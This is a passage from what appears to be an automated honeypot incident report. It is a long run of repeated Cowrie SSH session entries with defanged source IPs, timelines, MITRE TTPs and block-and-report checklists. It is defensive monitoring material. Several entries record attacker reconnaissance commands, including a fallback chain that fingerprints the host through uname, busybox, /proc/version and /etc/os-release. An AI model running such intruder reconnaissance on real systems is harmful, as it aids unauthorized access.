| `2026-08-15 05:30:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36415a568d3e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:30 |
| **Last Seen** | 2026-08-15 05:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:30:20` | `cowrie.session.connect` |
| `2026-08-15 05:30:20` | `cowrie.client.version` |
| `2026-08-15 05:30:20` | `cowrie.client.kex` |
| `2026-08-15 05:30:21` | `cowrie.login.success` |
| `2026-08-15 05:30:22` | `cowrie.session.params` |
| `2026-08-15 05:30:22` | `cowrie.command.input` |
| `2026-08-15 05:30:22` | `cowrie.log.closed` |
| `2026-08-15 05:30:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aab24e342f80

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:30 |
| **Last Seen** | 2026-08-15 05:30 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:30:25` | `cowrie.session.connect` |
| `2026-08-15 05:30:26` | `cowrie.client.version` |
| `2026-08-15 05:30:26` | `cowrie.client.kex` |
| `2026-08-15 05:30:27` | `cowrie.login.success` |
| `2026-08-15 05:30:28` | `cowrie.session.params` |
| `2026-08-15 05:30:28` | `cowrie.command.input` |
| `2026-08-15 05:30:28` | `cowrie.log.closed` |
| `2026-08-15 05:30:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cec9a8173f7c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:30 |
| **Last Seen** | 2026-08-15 05:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:30:31` | `cowrie.session.connect` |
| `2026-08-15 05:30:31` | `cowrie.client.version` |
| `2026-08-15 05:30:31` | `cowrie.client.kex` |
| `2026-08-15 05:30:32` | `cowrie.login.success` |
| `2026-08-15 05:30:33` | `cowrie.session.params` |
| `2026-08-15 05:30:33` | `cowrie.command.input` |
| `2026-08-15 05:30:33` | `cowrie.log.closed` |
| `2026-08-15 05:30:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11b19bcf955e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:30 |
| **Last Seen** | 2026-08-15 05:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:30:37` | `cowrie.session.connect` |
| `2026-08-15 05:30:37` | `cowrie.client.version` |
| `2026-08-15 05:30:37` | `cowrie.client.kex` |
| `2026-08-15 05:30:37` | `cowrie.login.success` |
| `2026-08-15 05:30:38` | `cowrie.session.params` |
| `2026-08-15 05:30:38` | `cowrie.command.input` |
| `2026-08-15 05:30:38` | `cowrie.log.closed` |
| `2026-08-15 05:30:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53f7df422f3b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:30 |
| **Last Seen** | 2026-08-15 05:30 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:30:42` | `cowrie.session.connect` |
| `2026-08-15 05:30:42` | `cowrie.client.version` |
| `2026-08-15 05:30:42` | `cowrie.client.kex` |
| `2026-08-15 05:30:43` | `cowrie.login.success` |
| `2026-08-15 05:30:44` | `cowrie.session.params` |
| `2026-08-15 05:30:44` | `cowrie.command.input` |
| `2026-08-15 05:30:44` | `cowrie.log.closed` |
| `2026-08-15 05:30:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab7e3be8deca

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:30 |
| **Last Seen** | 2026-08-15 05:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:30:47` | `cowrie.session.connect` |
| `2026-08-15 05:30:47` | `cowrie.client.version` |
| `2026-08-15 05:30:47` | `cowrie.client.kex` |
| `2026-08-15 05:30:48` | `cowrie.login.success` |
| `2026-08-15 05:30:48` | `cowrie.session.params` |
| `2026-08-15 05:30:48` | `cowrie.command.input` |
| `2026-08-15 05:30:49` | `cowrie.log.closed` |
| `2026-08-15 05:30:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b40574bc624

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:30 |
| **Last Seen** | 2026-08-15 05:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:30:52` | `cowrie.session.connect` |
| `2026-08-15 05:30:52` | `cowrie.client.version` |
| `2026-08-15 05:30:52` | `cowrie.client.kex` |
| `2026-08-15 05:30:53` | `cowrie.login.success` |
| `2026-08-15 05:30:54` | `cowrie.session.params` |
| `2026-08-15 05:30:54` | `cowrie.command.input` |
| `2026-08-15 05:30:54` | `cowrie.log.closed` |
| `2026-08-15 05:30:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe3a492d931e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:30 |
| **Last Seen** | 2026-08-15 05:31 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:30:57` | `cowrie.session.connect` |
| `2026-08-15 05:30:58` | `cowrie.client.version` |
| `2026-08-15 05:30:58` | `cowrie.client.kex` |
| `2026-08-15 05:30:58` | `cowrie.login.success` |
| `2026-08-15 05:30:59` | `cowrie.session.params` |
| `2026-08-15 05:30:59` | `cowrie.command.input` |
| `2026-08-15 05:31:00` | `cowrie.log.closed` |
| `2026-08-15 05:31:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95945caba709

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:31 |
| **Last Seen** | 2026-08-15 05:31 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:31:03` | `cowrie.session.connect` |
| `2026-08-15 05:31:03` | `cowrie.client.version` |
| `2026-08-15 05:31:03` | `cowrie.client.kex` |
| `2026-08-15 05:31:04` | `cowrie.login.success` |
| `2026-08-15 05:31:04` | `cowrie.session.params` |
| `2026-08-15 05:31:04` | `cowrie.command.input` |
| `2026-08-15 05:31:05` | `cowrie.log.closed` |
| `2026-08-15 05:31:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64895f815d58

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:31 |
| **Last Seen** | 2026-08-15 05:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:31:08` | `cowrie.session.connect` |
| `2026-08-15 05:31:08` | `cowrie.client.version` |
| `2026-08-15 05:31:08` | `cowrie.client.kex` |
| `2026-08-15 05:31:08` | `cowrie.login.success` |
| `2026-08-15 05:31:09` | `cowrie.session.params` |
| `2026-08-15 05:31:09` | `cowrie.command.input` |
| `2026-08-15 05:31:09` | `cowrie.log.closed` |
| `2026-08-15 05:31:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c1f0ed5dff3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:31 |
| **Last Seen** | 2026-08-15 05:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:31:13` | `cowrie.session.connect` |
| `2026-08-15 05:31:13` | `cowrie.client.version` |
| `2026-08-15 05:31:13` | `cowrie.client.kex` |
| `2026-08-15 05:31:13` | `cowrie.login.success` |
| `2026-08-15 05:31:14` | `cowrie.session.params` |
| `2026-08-15 05:31:14` | `cowrie.command.input` |
| `2026-08-15 05:31:15` | `cowrie.log.closed` |
| `2026-08-15 05:31:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4b06890e8a5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:31 |
| **Last Seen** | 2026-08-15 05:31 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:31:18` | `cowrie.session.connect` |
| `2026-08-15 05:31:18` | `cowrie.client.version` |
| `2026-08-15 05:31:18` | `cowrie.client.kex` |
| `2026-08-15 05:31:19` | `cowrie.login.success` |
| `2026-08-15 05:31:20` | `cowrie.session.params` |
| `2026-08-15 05:31:20` | `cowrie.command.input` |
| `2026-08-15 05:31:20` | `cowrie.log.closed` |
| `2026-08-15 05:31:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d1f74668967

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:31 |
| **Last Seen** | 2026-08-15 05:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:31:23` | `cowrie.session.connect` |
| `2026-08-15 05:31:24` | `cowrie.client.version` |
| `2026-08-15 05:31:24` | `cowrie.client.kex` |
| `2026-08-15 05:31:24` | `cowrie.login.success` |
| `2026-08-15 05:31:25` | `cowrie.session.params` |
| `2026-08-15 05:31:25` | `cowrie.command.input` |
| `2026-08-15 05:31:25` | `cowrie.log.closed` |
| `2026-08-15 05:31:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-663daf6cc882

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:31 |
| **Last Seen** | 2026-08-15 05:31 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:31:28` | `cowrie.session.connect` |
| `2026-08-15 05:31:28` | `cowrie.client.version` |
| `2026-08-15 05:31:28` | `cowrie.client.kex` |
| `2026-08-15 05:31:29` | `cowrie.login.success` |
| `2026-08-15 05:31:30` | `cowrie.session.params` |
| `2026-08-15 05:31:30` | `cowrie.command.input` |
| `2026-08-15 05:31:30` | `cowrie.log.closed` |
| `2026-08-15 05:31:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc4666881aae

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:31 |
| **Last Seen** | 2026-08-15 05:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:31:33` | `cowrie.session.connect` |
| `2026-08-15 05:31:33` | `cowrie.client.version` |
| `2026-08-15 05:31:33` | `cowrie.client.kex` |
| `2026-08-15 05:31:34` | `cowrie.login.success` |
| `2026-08-15 05:31:34` | `cowrie.session.params` |
| `2026-08-15 05:31:34` | `cowrie.command.input` |
| `2026-08-15 05:31:35` | `cowrie.log.closed` |
| `2026-08-15 05:31:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2dbf22a27889

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:31 |
| **Last Seen** | 2026-08-15 05:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:31:38` | `cowrie.session.connect` |
| `2026-08-15 05:31:38` | `cowrie.client.version` |
| `2026-08-15 05:31:38` | `cowrie.client.kex` |
| `2026-08-15 05:31:39` | `cowrie.login.success` |
| `2026-08-15 05:31:40` | `cowrie.session.params` |
| `2026-08-15 05:31:40` | `cowrie.command.input` |
| `2026-08-15 05:31:40` | `cowrie.log.closed` |
| `2026-08-15 05:31:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1026d07956dd

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:31 |
| **Last Seen** | 2026-08-15 05:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:31:44` | `cowrie.session.connect` |
| `2026-08-15 05:31:44` | `cowrie.client.version` |
| `2026-08-15 05:31:44` | `cowrie.client.kex` |
| `2026-08-15 05:31:44` | `cowrie.login.success` |
| `2026-08-15 05:31:45` | `cowrie.session.params` |
| `2026-08-15 05:31:45` | `cowrie.command.input` |
| `2026-08-15 05:31:45` | `cowrie.log.closed` |
| `2026-08-15 05:31:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e669b9778a31

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:31 |
| **Last Seen** | 2026-08-15 05:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:31:49` | `cowrie.session.connect` |
| `2026-08-15 05:31:49` | `cowrie.client.version` |
| `2026-08-15 05:31:49` | `cowrie.client.kex` |
| `2026-08-15 05:31:50` | `cowrie.login.success` |
| `2026-08-15 05:31:50` | `cowrie.session.params` |
| `2026-08-15 05:31:50` | `cowrie.command.input` |
| `2026-08-15 05:31:51` | `cowrie.log.closed` |
| `2026-08-15 05:31:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a701e9950b67

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:31 |
| **Last Seen** | 2026-08-15 05:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:31:54` | `cowrie.session.connect` |
| `2026-08-15 05:31:54` | `cowrie.client.version` |
| `2026-08-15 05:31:54` | `cowrie.client.kex` |
| `2026-08-15 05:31:55` | `cowrie.login.success` |
| `2026-08-15 05:31:55` | `cowrie.session.params` |
| `2026-08-15 05:31:55` | `cowrie.command.input` |
| `2026-08-15 05:31:56` | `cowrie.log.closed` |
| `2026-08-15 05:31:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af856abea506

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:32 |
| **Last Seen** | 2026-08-15 05:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:32:00` | `cowrie.session.connect` |
| `2026-08-15 05:32:00` | `cowrie.client.version` |
| `2026-08-15 05:32:00` | `cowrie.client.kex` |
| `2026-08-15 05:32:00` | `cowrie.login.success` |
| `2026-08-15 05:32:01` | `cowrie.session.params` |
| `2026-08-15 05:32:01` | `cowrie.command.input` |
| `2026-08-15 05:32:01` | `cowrie.log.closed` |
| `2026-08-15 05:32:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc5d83cca07a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:32 |
| **Last Seen** | 2026-08-15 05:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:32:05` | `cowrie.session.connect` |
| `2026-08-15 05:32:05` | `cowrie.client.version` |
| `2026-08-15 05:32:05` | `cowrie.client.kex` |
| `2026-08-15 05:32:05` | `cowrie.login.success` |
| `2026-08-15 05:32:06` | `cowrie.session.params` |
| `2026-08-15 05:32:06` | `cowrie.command.input` |
| `2026-08-15 05:32:06` | `cowrie.log.closed` |
| `2026-08-15 05:32:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d9cd33a817e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-15 05:32 |
| **Last Seen** | 2026-08-15 05:32 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:32:09` | `cowrie.session.connect` |
| `2026-08-15 05:32:09` | `cowrie.client.version` |
| `2026-08-15 05:32:09` | `cowrie.client.kex` |
| `2026-08-15 05:32:12` | `cowrie.login.success` |
| `2026-08-15 05:32:14` | `cowrie.session.params` |
| `2026-08-15 05:32:14` | `cowrie.command.input` |
| `2026-08-15 05:32:14` | `cowrie.command.input` |
| `2026-08-15 05:32:14` | `cowrie.command.input` |
| `2026-08-15 05:32:14` | `cowrie.command.input` |
| `2026-08-15 05:32:14` | `cowrie.command.input` |
| `2026-08-15 05:32:14` | `cowrie.command.success` |
| `2026-08-15 05:32:14` | `cowrie.command.input` |
| `2026-08-15 05:32:14` | `cowrie.command.input` |
| `2026-08-15 05:32:14` | `cowrie.command.input` |
| `2026-08-15 05:32:14` | `cowrie.command.input` |
| `2026-08-15 05:32:14` | `cowrie.log.closed` |
| `2026-08-15 05:32:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42e43c652a83

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:32 |
| **Last Seen** | 2026-08-15 05:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:32:10` | `cowrie.session.connect` |
| `2026-08-15 05:32:10` | `cowrie.client.version` |
| `2026-08-15 05:32:10` | `cowrie.client.kex` |
| `2026-08-15 05:32:11` | `cowrie.login.success` |
| `2026-08-15 05:32:12` | `cowrie.session.params` |
| `2026-08-15 05:32:12` | `cowrie.command.input` |
| `2026-08-15 05:32:12` | `cowrie.log.closed` |
| `2026-08-15 05:32:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8c8214df59f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-08-15 05:32 |
| **Last Seen** | 2026-08-15 05:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:32:15` | `cowrie.session.connect` |
| `2026-08-15 05:32:15` | `cowrie.client.version` |
| `2026-08-15 05:32:15` | `cowrie.client.kex` |
| `2026-08-15 05:32:16` | `cowrie.login.success` |
| `2026-08-15 05:32:17` | `cowrie.session.params` |
| `2026-08-15 05:32:17` | `cowrie.command.input` |
| `2026-08-15 05:32:17` | `cowrie.log.closed` |
| `2026-08-15 05:32:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f2e99616f11

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-15 05:32 |
| **Last Seen** | 2026-08-15 05:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
